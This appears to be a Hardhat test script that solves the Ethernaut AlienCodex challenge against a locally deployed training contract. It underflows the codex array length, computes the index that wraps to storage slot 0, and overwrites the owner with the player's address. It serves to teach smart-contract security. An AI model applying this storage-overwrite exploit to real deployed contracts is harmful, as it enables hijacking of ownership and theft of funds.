import { ethers } from "hardhat";
import { expect } from "chai";

describe("Ethernaut Level - AlienCodex", function () {
  it("Should become the owner via storage exploit", async function () {
    const [player] = await ethers.getSigners();

    // ✅ Deploy contract
    const AlienCodex = await ethers.getContractFactory("AlienCodex");
    const contract = await AlienCodex.deploy();
    await contract.waitForDeployment();
    console.log(`AlienCodex deployed at: ${contract.target}`);

    // ✅ Step 1: makeContact
    await (await contract.makeContact()).wait();

    // ✅ Step 2: trigger underflow
    await (await contract.retract()).wait();

    // ✅ Step 3: compute index to overwrite slot 0
    const codexSlot = 2;
    const hash = ethers.keccak256(
      ethers.zeroPadValue(ethers.toBeHex(codexSlot), 32)
    );
    const index =
      (BigInt(2) ** BigInt(256)) - BigInt(hash);

    console.log(`Computed index to overwrite slot 0: ${index.toString()}`);

    // ✅ Step 4: overwrite owner
    const paddedAddress = ethers.zeroPadValue(player.address, 32);
    await (await contract.revise(index, paddedAddress as `0x${string}`)).wait();

    // ✅ Check owner
    const owner = await contract.owner();
    console.log(`🎯 Owner is now: ${owner}`);

    expect(owner).to.equal(player.address);
  });
});
